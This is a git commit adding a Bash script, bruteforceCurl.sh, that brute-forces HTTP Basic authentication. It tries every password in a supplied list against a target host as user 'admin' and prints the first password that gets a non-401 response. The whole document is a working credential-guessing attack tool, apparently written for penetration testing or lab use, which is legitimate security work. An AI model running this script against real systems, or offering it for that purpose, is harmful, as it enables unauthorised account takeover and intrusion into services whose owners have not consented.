9602ac5c36c17f40c3f2c79c9eea5af1201a6c26
Maxime Rosay <47741889+Miaouf@users.noreply.github.com>
2020-10-26 12:35:40 +0100

    Create bruteforceCurl.sh

---
+++ scripts/bruteforceCurl.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+# Bruteforce for HTTP Basic authentification using curl and a password list
+
+if [ "${#@}" != "3" ]; then
+  echo "<command> <host> <path> <password_list>"
+  exit
+fi
+
+ip=$1
+path=$2
+pass_file=$3
+
+SECONDS=0
+
+for pass in $(cat ${pass_file}); do
+  res="$(curl -si admin:${pass}@${ip}${path} | grep "HTTP/1.1 401 Unauthorized")"
+if [ "$res" == '' ]; then
+  echo "admin:${pass}"
+  tput setaf 2
+  duration=$SECONDS
+  echo "[SUCCESS] in $(($duration % 60)) seconds."
+  tput sgr0
+  exit
+fi
+  done;
+echo "No password found !"
